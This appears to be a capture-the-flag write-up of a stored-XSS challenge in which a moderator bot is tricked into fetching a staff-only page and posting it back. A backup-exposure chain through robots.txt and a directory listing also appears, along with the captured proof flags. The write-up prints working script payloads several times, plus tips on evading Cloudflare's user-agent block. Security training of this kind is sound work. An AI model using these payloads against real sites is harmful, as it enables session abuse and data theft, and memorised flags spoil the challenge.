---
day: 7
slug: "stored-xss"
lane: web-exploitation
modes: [single_solve, time_trial, mastery]
has_solve_py: [single_solve, time_trial, mastery]
tags: []  # TODO: fill in descriptive kebab-case bug-class/technique tags, e.g. [reflected-xss, idor]
---

## single_solve

# Day 07 — "🌐 Stored for Later" (single_solve)

Attempt `a2b67283-aff7-44a4-b988-67fe591eceeb`, one target, one answer id `proof-1`.

Target: `https://810393483baadbe99a2b69d16e466a9559e2c649f6f69a11.2026.huntress.ctf.games/`

## Classification

Stored XSS with a headless "moderator" reviewer bot. Root page copy: "Leave a
thoughtful note. A real moderator will open it in a real browser." FastAPI app.

## Recon evidence (all on the assigned origin)

- `GET /` — 200 HTML guestbook landing (`evidence/root.html`, headers in
  `evidence/headers-root.txt`).
- `GET /openapi.json` — 200 (`evidence/openapi.json`). Routes: `/api/clues`,
  `POST /api/messages`, `/messages/{id}`, `/messages-review/{id}`,
  `/_moderator/{token}/{feedback_id}`, `/support-3a6da4e3` ("Admin Objective"),
  `POST /api/messages/{id}/evidence-1b9726` ("Evidence").
- `GET /api/clues` — 200 (`evidence/clues.json`):
  `{"framework":"FastAPI","feature_route":"/messages","current_role":"analyst",
  "moderation_workflow":"Submitted notes are opened in an authenticated moderator browser.",
  "moderator_data_route":"/support-3a6da4e3",
  "receipt_route_template":"/api/messages/{id}/evidence-1b9726"}`
- `GET /support-3a6da4e3` unauthenticated — **403 "moderator only"**
  (`evidence/support-anon.txt`). The objective is gated on the bot's session.
- `GET /messages-review/1` unauthenticated — 403 (`evidence/headers-review1.txt`).
- Message field discovery: `POST /api/messages {}` → 201 `{"id":1,...}` but the
  page rendered empty; `{"message":12345}` rendered `12345` raw; so the stored
  field is **`message`**. `{"message":"<b>MARKERPROBE123</b>"}` rendered back as
  raw unescaped HTML in `<div class='message'>` (`evidence/msg4.html`) → stored
  XSS confirmed. Unknown fields are silently ignored, wrong types do not 422.
- `POST /api/messages/4/evidence-1b9726 {"evidence":"hello-test"}` →
  `{"stored":true}` and the receipt renders as
  `<strong>Moderator receipt</strong><pre>hello-test</pre>` on `/messages/4`
  (`evidence/msg4b.html`) — the receipt route is the exfil channel back to us.
- Cloudflare sits in front; Python's default urllib UA gets **403 error code
  1010**. A browser User-Agent is required for all requests.

## Exploit

`solve.py` (reusable, target URL is its only argument):

1. `GET /api/clues` → derive `moderator_data_route` and `receipt_route_template`
   (never hard-coded; they carry per-attempt hex suffixes).
2. `POST /api/messages {"message":"placeholder"}` → learn current id N; the
   payload message is then posted bound to id N+1 (ids are sequential).
3. `POST /api/messages {"message": <script>fetch('/support-3a6da4e3',
   {credentials:'include'}).then(r=>r.text()).then(t=>fetch(
   '/api/messages/<id>/evidence-1b9726',{method:'POST',headers:
   {'Content-Type':'application/json'},body:JSON.stringify({evidence:t})}))
   </script>}` — a **same-origin** fetch in the moderator bot's authenticated
   browser; the 403-gated route returns the proof to the bot, which POSTs it
   back to our own message's receipt route. No outbound callback is needed —
   the app itself is the exfil channel.
4. Poll `GET /messages/<id>` (6 s intervals) until the "Moderator receipt"
   `<pre>` appears; extract the `proof_<hex>` string.

Actual run (`evidence/solve-stderr.log`, `evidence/solve-stdout.json`):
placeholder id 5, payload message id 6, receipt captured on the first poll
(within seconds — the bot visits promptly).

## Answer evidence

- `GET /messages/6` after the bot visit
  (`evidence/msg6-final.html`):
  `Moderator receipt</strong><pre>proof_68bf86bbcd8c42d48b7f1d7d34b58717</pre>`

## Answer

- `proof-1` = `proof_68bf86bbcd8c42d48b7f1d7d34b58717` (matches the question's
  `trim` normalization; exact `proof_<hex>` string as requested).

## Round 2 (2026-10-22 23:34 UTC) — verification, no new solve needed

Round 2 delivered a byte-identical start.json: same attempt_id
`a2b67283-aff7-44a4-b988-67fe591eceeb`, same Target 1 URL, same answer_ids,
`accepted_ids: []`. The only provisioning diff vs round 1 is that `routes[]`
was populated (the route path was already live in round 1). Because this is
the same attempt on the same live target, the proof recovered from the
current target's own state (`evidence/msg6-final.html`, message id 6,
`Moderator receipt` pre block) is this attempt's proof, not a foreign reuse.
`answers.json` written with exactly the one answer_id. Prior grading feedback
was `null`; no incorrect/accepted signal to correct.

## Limits / notes

- The `/_moderator/{token}/{feedback_id}` bootstrap route exists but the token
  was not needed; the bot visits on its own schedule after submission.
- Request count stayed small (~15 total, ~0.7–6 s pacing); only the assigned
  origin was contacted; no GM token was sent to the target.
- The empty-JSON POST returning 500 on `null` body is a server quirk, not used.

## time_trial

# Day 07 — "🌐 Stored for Later" (time_trial)

Attempt `a814feaa-8c5f-422b-9405-e15479761a58` (untimed time-trial, `run_for_time:
false`, `deadline: null`), one target, one answer id `proof-1`.

Target: `https://f1953703be901d13f3eb98f79f3a43e986d136e7504471cd.2026.huntress.ctf.games/`

## Classification

Same stored-XSS "Feedback Loop" app family as single_solve (FastAPI, moderator
bot), but this variant renamed the collection: `messages` → `feedback`, with
fresh per-attempt hex suffixes. All route names below were derived from this
attempt's live `/api/clues`, never reused from the earlier mode.

## Recon evidence (all on the assigned origin)

- `GET /api/clues` — 200 (`evidence/solve-stderr2.log` line 1):
  `{"framework":"FastAPI","feature_route":"/feedback","current_role":"analyst",
  "moderation_workflow":"Submitted notes are opened in an authenticated
  moderator browser.","moderator_data_route":"/support-a8929699",
  "receipt_route_template":"/api/feedback/{id}/result-392173"}`
- First run of the single_solve solver failed at `POST /api/messages` →
  **405 Method Not Allowed** (`evidence/solve-stdout.json`), proving this
  variant's submit route is not `/api/messages`.
- `GET /` — 200 (`evidence/root.html`, headers `evidence/headers-root.txt`).

## Solver generalization (solve.py, reusable)

The submit endpoint is derived generically from the receipt template:
`/api/<coll>/{id}/...` ⇒ submit `POST /api/<coll>`, view `GET /<coll>/{id}`.
Nothing is hard-coded per variant. Exploit loop:

1. `GET /api/clues` → `moderator_data_route` (`/support-a8929699`) and
   `receipt_route_template` (`/api/feedback/{id}/result-392173`).
2. `POST /api/feedback {"message":"placeholder"}` → 201, `{"id":1}`.
3. `POST /api/feedback {"message":"<script>fetch('/support-a8929699',
   {credentials:'include'}).then(r=>r.text()).then(t=>fetch(
   '/api/feedback/2/result-392173',{method:'POST',headers:{'Content-Type':
   'application/json'},body:JSON.stringify({evidence:t})}))</script>"}` →
   201, `{"id":2}` (sequential id guessed correctly).
4. Moderator bot opened the stored message; its authenticated browser fetched
   the 403-gated moderator route same-origin and POSTed the body back to our
   message's receipt route. Receipt captured on the first poll
   (`evidence/solve-stderr2.log`: "receipt captured on poll 0").

## Answer evidence

- `GET /feedback/2` after the bot visit (`evidence/feedback2-final.html`,
  headers `evidence/headers-feedback2.txt`) contains
  `proof_6f9a40ab277146fc90e2ac2b88eb4c8b` inside the moderator receipt.
- Solver stdout: `evidence/solve-stdout2.json`.

## Answer

- `proof-1` = `proof_6f9a40ab277146fc90e2ac2b88eb4c8b` (exact `proof_<hex>`
  string; question normalization is `trim`).

## Limits / notes

- Fresh proof for this attempt — distinct from single_solve's
  (`proof_68bf86…`); no cross-attempt reuse.
- Only the assigned origin was contacted; ~8 requests total with 0.8 s pacing
  and 6 s poll wait; browser User-Agent required (Cloudflare 1010 blocks the
  urllib default, same as single_solve).
- No GM token sent to the target; no redirects followed off-origin.
- Prior grading feedback for this mode: `null` (first round).

## mastery

# Day 07 — "🌐 Stored for Later" (mastery)

Attempt `f6b8d648-7b03-4787-abbb-e1479fe26a9a` (untimed mastery, `run_for_time:
false`, `deadline: null`), two targets, answer ids `proof-1` (Target 1) and
`proof-2` (Target 2). As the lessons brief predicts, mastery mixed bug classes:
**Target 1 is backup exposure**, not the family's named stored XSS.

- Target 1: `https://38d30c70ddd800aaf34da794080dc4e66adfdc826b0e8c3b.2026.huntress.ctf.games/`
- Target 2: `https://f7bc612b229f94977455331fc9f1cb2964bc22430076aa13.2026.huntress.ctf.games/`

## Target 1 — backup exposure ("Tiny Uptime", native Node.js HTTP server)

Evidence chain (all responses saved under `evidence/`, `t1-*` prefix):

1. `GET /` (`t1-root.html`) — status page with an HTML comment:
   `<!-- deployment note: remember to review crawler policy before launch -->`
   → crawler-policy hint.
2. `GET /robots.txt` (`t1-robots.txt`) — `Disallow: /releases-44bba/`
   → discloses the hidden directory.
3. `GET /releases-44bba/` (`t1-releases.html`) — open directory index naming
   `site-config-de213c.json.bak` ("JSON backup") and `release-notes.txt`.
4. `GET /releases-44bba/site-config-de213c.json.bak` (`t1-site-config.bak`):
   ```json
   {"environment": "production",
    "support_note": "proof_217a99c166ae49e788327573c03a32e6"}
   ```

**`proof-1` = `proof_217a99c166ae49e788327573c03a32e6`**

No wordlists used; every path was derived from the previous response, matching
the historical backup-exposure method (root comment → robots Disallow →
directory listing → named backup).

## Target 2 — stored XSS ("Kind Regards", FastAPI, moderator bot)

Same app family as this family's single_solve/time_trial; this variant renamed
the collection to `postcards` with fresh hex suffixes. All routes derived from
this attempt's live `/api/clues` (`t2-clues.json`):

```json
{"framework":"FastAPI","feature_route":"/postcards","current_role":"analyst",
 "moderation_workflow":"Submitted notes are opened in an authenticated moderator browser.",
 "moderator_data_route":"/staff-ba832ab0",
 "receipt_route_template":"/api/postcards/{id}/receipt-30f87c"}
```

Exploit (`solve.py`, the generalized family solver — submit/view routes derived
from the receipt template, nothing hard-coded; log `t2-solve-stderr.log`):

1. `POST /api/postcards {"message":"placeholder"}` → 201 `{"id":1}`.
2. `POST /api/postcards {"message":"<script>fetch('/staff-ba832ab0',
   {credentials:'include'}).then(r=>r.text()).then(t=>fetch(
   '/api/postcards/2/receipt-30f87c',{method:'POST',headers:{'Content-Type':
   'application/json'},body:JSON.stringify({evidence:t})}))</script>"}` →
   201 `{"id":2}`.
3. Moderator bot opened the stored note; its authenticated browser fetched the
   analyst-403-gated `/staff-ba832ab0` same-origin and POSTed the body back to
   our note's receipt route. Receipt captured on the first poll.
4. `GET /postcards/2` (`t2-postcard2-final.html`) contains
   `proof_18a9c83469f24a9fb3464b20ec406398` in the moderator receipt block.

**`proof-2` = `proof_18a9c83469f24a9fb3464b20ec406398`**

## Answers

- `proof-1` = `proof_217a99c166ae49e788327573c03a32e6` (Target 1, backup exposure)
- `proof-2` = `proof_18a9c83469f24a9fb3464b20ec406398` (Target 2, stored XSS)

Both are exact `proof_<hex>` strings per each question's `exact_text` format
with `trim` normalization; both recovered fresh from this attempt's targets.

## Limits / notes

- Both proofs are distinct from the single_solve (`proof_68bf86…`) and
  time_trial (`proof_6f9a40…`) proofs; no cross-attempt reuse.
- ~10 requests total across both targets, 0.8 s pacing, 30 s timeouts, browser
  User-Agent (Cloudflare 1010 blocks urllib's default UA on this lane).
- Only the two assigned origins were contacted; no redirects followed
  off-origin; no GM token sent to targets.
- Prior grading feedback for this mode: `null` (first round).

## Later consolidated reference (release day 21)

A later, independent pass re-solved this family using the shared `recovery_lib.py` classifier and wrote this condensed reference, folded from the same per-attempt evidence as the section(s) above. Preserved verbatim (heading levels only demoted to nest under this section):

### 07 — Stored XSS via moderator bot

`GET /api/clues` (sometimes only discoverable via `/openapi.json`, not a literal root-page link —
see the carry-forward note below) discloses `feature_route` (a `/<collection>` guestbook), a
403-gated `moderator_data_route`, and a `receipt_route_template` like `/api/<collection>/{id}/<suffix>`.
The posted `message` field renders unescaped. A real moderator bot opens every new message in an
authenticated browser, so:

1. `POST feature_route {"message":"placeholder"}` to learn the current id `N`.
2. `POST feature_route` again with a `<script>` payload bound to id `N+1`, that does
   `fetch(moderator_data_route,{credentials:'include'}).then(...).then(t=>fetch(receipt_route_for_id,
   {method:'POST', body:{evidence:t}}))` — a **same-origin** fetch riding the bot's own session; no
   outbound callback host is needed, the app itself is the exfil channel.
3. Poll `GET /<collection>/<id>` every ~6s until the "Moderator receipt" `<pre>` block appears
   (receipt usually lands within seconds to one poll) and extract `proof_<hex>` from it.

Example (attempt `f6b8d648-...`, 2026-10-22): `moderator_data_route=/staff-ba832ab0`,
`receipt_route_template=/api/postcards/{id}/receipt-30f87c` → `proof_18a9c83469f24a9fb3464b20ec406398`.
`recovery_lib.rec_stored_xss_bot`.

### Mastery is cumulative across curriculum days, not just within release day 21

Each family's mastery mode had **3 targets mixing earlier bug classes**, confirming the lessons in
`docs/web-worker-lessons.md`: 06's mastery mixed backup exposure (day-19 class) + its own
reflect-callback; 07's mixed backup exposure + its own stored XSS; 08's mixed backup exposure + IDOR
(day-19 class) + its own session fixation. Classify every target independently by joining
`questions[].artifact` to `targets[].id` — never assume mastery repeats only the named family's bug.
`recovery_lib.classify_and_recover` tries clues-driven classes, then IDOR, then backup exposure, in
that order, and returns `None` (a real "unclassified" signal, not a bug) when nothing matches.

### Carry-forward for future days

- **Do not gate on `"/api/clues" in root_html`** before fetching the clues API: day-07's app only
  discloses `/api/clues` via `/openapi.json`, never as literal text on the root page. Always attempt
  `GET /api/clues` directly and treat a non-200 as "this app has no clues API" (this is how
  `recovery_lib.classify_and_recover` is written now — an earlier draft that pre-filtered on the
  substring silently misclassified a synthetic stored-XSS fixture in testing before this fix).
- Cloudflare in front of these apps 403s (`error code 1010`) on urllib's default User-Agent; always
  send a browser UA (`recovery_lib.UA`).
- Route suffixes, nonces, session hints and backup filenames are per-attempt; a fresh variant always
  re-derives them from the current `/api/clues`/`/robots.txt`/directory-index responses, never from a
  saved value here.
